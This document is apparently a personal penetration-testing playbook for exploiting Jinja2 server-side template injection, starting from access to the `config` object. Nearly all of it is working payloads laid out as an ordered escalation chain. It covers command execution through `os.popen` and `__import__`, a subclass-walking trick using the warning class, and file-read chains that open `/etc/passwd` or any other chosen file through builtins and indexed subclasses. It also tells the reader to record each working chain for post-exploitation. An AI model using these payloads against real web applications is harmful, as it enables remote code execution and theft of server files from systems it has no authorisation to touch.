
## Goal

Land here because `{{config}}` rendered object/value.

Goal: gain the first useful primitive from `config` access, record the exact working chain, then route to [[Jinja2 SSTI - Post-Primitive Workflow]].

## 1. Direct globals -> os -> popen

Payload:
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

- Output (e.g. `uid=...`) -> **RCE** confirmed -> record working command information and go to [[Jinja2 SSTI - Post-Primitive Workflow]]
  i. Primitive type: `RCE`
  ii. Exact working prefix/chain: `config.__class__.__init__.__globals__['os'].`  
  iii. Pattern that worked: `popen('id').read()`
- Empty / blocked / error -> record exact response -> go to 2

## 2. Builtins -> import fallback

Payload:
`{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`

- Output -> **RCE** confirmed -> record working command information and go to:
  [[Jinja2 SSTI - Post-Primitive Workflow]]
  i. Primitive Type: `RCE`
  ii. Exact working prefix/chain: `config.__class__.__init__.__globals__['__builtins__']['__import__']('os').`
  iii. Pattern that worked: `popen('id').read()`
- Empty / blocked / error -> record exact response -> go to 3

## 3. Subclasses RCE (warning loop/trick)

Payload:
`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}`

- Output -> **RCE** confirmed -> record working command information and go to: [[Jinja2 SSTI - Post-Primitive Workflow]]
  i. Primitive Type: `RCE`
  ii. Exact working prefix/chain: `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').`
  iii. Pattern that worked: `warning loop/trick`
- No output / error -> record exact response -> go to 4

## 4. File read (fallback when direct RCE paths fail)

Goal: recover `open()` (or any file‑like callable) from Python internals and read `/etc/passwd` (or other files of interest).

### **4.1 Function globals → open**

**Test these EXACT functions in order:**
1. `{{ config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
2. `{{ config.from_pyfile.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
3. `{{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
4. `{{ request.application.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
5. `{{ cycler.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
> [!note]
> Replace the absolute file path , in this example `/etc/passwd`, with other absolute file paths you may wish to try and read.

- Output looks like genuine file contents → SUCCESS
  i. Primitive type: `file-read`
  ii. Exact working prefix/chain: `config.__class__.__init__.__globals__['__builtins__']['open']` (or whichever of the above functions 1-5 actually worked)  
  iii. Pattern that worked: `('/etc/passwd').read()`
  -> [[Jinja2 SSTI - Post-Primitive Workflow#**4. File operations (only if primitive = file-read)** Use the exact file-read chain you recorded (with your working INDEX).]]      
- Empty / blocked / error → record exact response → go to 4.2

### **4.2 Subclasses**

**Step 1 - dump subclasses:**

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

**Step 2 - search for the follow classes in the subclass dump:**

| Category          | Class Search Terms                                |
| ----------------- | ------------------------------------------------- |
| DIRECT PATH       | TextIOWrapper, FileIO, BufferedReader             |
| GLOBALS CHAIN     | FileWrapper, _TemporaryFileWrapper, TemporaryFile |
| STREAM ACCESS     | FileStorage                                       |
| ARCHIVE           | ZipFile                                           |
| FRAMEWORK HELPERS | _SharedFile, _Tellable                            |
> [!note]
> You are not necessarily looking for the Class Search Terms to be the exact class names, as some class names can be class chains. For example, searching for `FileWrapper` may return `werkzeug.wsgi.FileWrapper` which is a class name you will want to include in the next step. 

List all found class matches and their associated indices (the subclass dump is indexed from zero), along with their associated Category from the above table.

You can now test by category, replacing `N` with the appropriate index.


`{{''.__class__.__mro__[1].__subclasses__()[N]('filename','/etc/passwd').stream.read()}}`

| Category          | Payload                                                                                                              |
| ----------------- | -------------------------------------------------------------------------------------------------------------------- |
| DIRECT PATH       | `{{''.__class__.__mro__[1].__subclasses__()[N]('/etc/passwd').read()}}`                                              |
| GLOBALS CHAIN     | `{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}` |
| STREAM ACCESS     | `{{''.__class__.__mro__[1].__subclasses__()[N]().stream.read()}}`                                                    |
| ARCHIVE           | `{{''.__class__.__mro__[1].__subclasses__()[N]('/etc/passwd').read()}}`                                              |
| FRAMEWORK HELPERS | `{{''.__class__.__mro__[1].__subclasses__()[N]('/etc/passwd').read()}}`                                              |
> [!note]
> Replace the absolute file path , in this example `/etc/passwd`, with other absolute file paths you may wish to try and read.

DIRECT PATH / GLOBALS / etc. works → SUCCESS
i. Primitive type: `file-read`
ii. Exact working chain: `''.__class__.__mro__[1].__subclasses__()[N]` (whichever payload from the above table worked, the exact chain is the part of the injection command that comes before `('/etc/passwd').read()`)
iii. Pattern that worked: DIRECT PATH|STREAM ACCESS|etc.
→ [[Jinja2 SSTI - Post-Primitive Workflow#**4. File operations (only if primitive = file-read)** Use the exact file-read chain you recorded (with your working INDEX).]]
